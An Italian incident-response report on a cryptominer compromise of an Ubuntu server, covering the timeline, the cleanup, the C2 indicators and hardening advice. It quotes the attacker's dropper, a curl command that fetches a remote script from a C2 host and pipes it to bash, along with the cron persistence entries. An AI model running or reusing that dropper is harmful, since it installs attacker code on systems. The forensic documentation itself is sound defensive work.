# Incident Response — Cryptominer / Server Compromesso

**Data rilevazione:** 2026-03-15
**Server:** ubuntu-8gb-hel1-1 (`77.42.93.2`)
**OS:** Ubuntu 24.04, 4 core, 8GB RAM, no GUI

---

## Sintomi iniziali

- 2 core su 4 al 100% CPU
- ~2.4 GB RAM occupata da processo sconosciuto
- Processo con nome esadecimale `1eb3ee8f` in `/var/tmp/`

---

## Analisi — Cosa è stato trovato

### Processo malevolo (PID 939 → 3153)

- Binario: `/var/tmp/2a5ffb76/1eb3ee8f` (3 MB, compresso UPX)
- Secondo binario: `/var/tmp/2a5ffb76/dac5424f` (863 KB)
- Pattern: cryptominer (XMRig o derivato)
- Si riavviava automaticamente ogni minuto tramite cron

### Script dropper `.c`

```bash
#!/bin/bash
if curl -s --connect-timeout 15 195.24.237.240/.x/black3; then
    curl -s 195.24.237.240/.x/black3 | bash >/dev/null 2>&1
else
    curl -s --connect-timeout 15 digital.digitaldatainsights.org/.x/black3 | bash >/dev/null 2>&1
fi
```

- Scaricava ed eseguiva `black3` da server C2 ogni 30 minuti

### Cron job malevoli (installati su ENTRAMBI root e openclaw)

```
* * * * *    /var/tmp/8133ac20/./dac5424f   # riavvio ogni minuto
@reboot      /var/tmp/8133ac20/./dac5424f   # persistenza al boot
@daily       /var/tmp/8133ac20/./dac5424f
@monthly     /var/tmp/8133ac20/./dac5424f
*/30 * * * * /var/tmp/8133ac20/./.c         # re-download dropper
```

### Directory malevole

- `/var/tmp/2a5ffb76/` — binari miner
- `/var/tmp/8133ac20/` — copia operativa con cron
- `/var/tmp/.ladyg0g0/` — directory nascosta con file `.pr1nc35` (puntava a `8133ac20`)

### Chiave SSH backdoor

File: `/home/openclaw/.ssh/authorized_keys`

```
ssh-rsa AAAAB3NzaC1yc2EAAA...ElPatrono1337
```

Chiave dell'attaccante rimossa.

### Hash binari (per reference/AV)

- `1eb3ee8f` MD5: `4f31455ed5a1f9d18c3b69ee31a2a23e`
- `1eb3ee8f` SHA256: `b9d45467065a3b3c66e4b55431585e66c7efe9f393d5e31a7d58ed5371d445e3`

---

## Cronologia dell'attacco

| Data             | Evento                                                                                                                                        |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| 2026-02-23 18:05 | IP `5.172.93.115` accede come **root** via SSH con password                                                                                   |
| 2026-02-26 23:02 | Dal server viene abilitata `PasswordAuthentication yes` + restart sshd (sudo dall'utente openclaw — probabile accesso precedente compromesso) |
| 2026-02-27 05:43 | Binari miner scaricati e installati in `/var/tmp/`                                                                                            |
| 2026-02-27+      | Miner in esecuzione continua, cron ogni minuto                                                                                                |
| 2026-03-15       | Rilevazione e cleanup                                                                                                                         |

**Vettore:** accesso SSH root con password debole dall'IP `5.172.93.115`

---

## Cleanup eseguito

| Azione                                                       | Stato |
| ------------------------------------------------------------ | ----- |
| Processo miner terminato (`kill -9`)                         | ✅    |
| Cron malevoli rimossi (`crontab -r` su root e openclaw)      | ✅    |
| Directory `/var/tmp/2a5ffb76/` rimossa                       | ✅    |
| Directory `/var/tmp/8133ac20/` rimossa                       | ✅    |
| Directory `/var/tmp/.ladyg0g0/` rimossa                      | ✅    |
| Chiave backdoor `ElPatrono1337` rimossa da `authorized_keys` | ✅    |
| Chiave SSH legittima owner aggiunta                          | ✅    |
| `PasswordAuthentication no` in `sshd_config`                 | ✅    |
| `PermitRootLogin prohibit-password` in `sshd_config`         | ✅    |
| IP C2 `195.24.237.240` bloccato con iptables                 | ✅    |
| Password root cambiata                                       | ✅    |

---

## Configurazione SSH post-incident

File `~/.ssh/config` su Windows (client):

```
Host 77.42.93.2
  HostName 77.42.93.2
  User root
  IdentityFile ~/.ssh/id_ed25519
```

Chiave pubblica owner aggiunta a:

- `/root/.ssh/authorized_keys`
- `/home/openclaw/.ssh/authorized_keys`

---

## IP e domini C2

| Indicatore                        | Tipo          | Note                      |
| --------------------------------- | ------------- | ------------------------- |
| `195.24.237.240`                  | IP C2         | Bloccato con iptables     |
| `digital.digitaldatainsights.org` | Dominio C2    | Non risolve più (offline) |
| `5.172.93.115`                    | IP attaccante | Primo accesso root        |

---

## Raccomandazioni future

1. **Abilitare fail2ban** per bloccare brute-force SSH
2. **Cambiare porta SSH** da 22 a una porta non standard
3. **Firewall in ingresso** — limitare SSH solo agli IP autorizzati
4. **Monitoring cron** — verificare periodicamente `crontab -l` su tutti gli utenti
5. **Audit periodico** di `/var/tmp`, `/tmp`, `/dev/shm` per binari sospetti
6. **Aggiornare il sistema:** `sudo apt update && sudo apt upgrade -y`
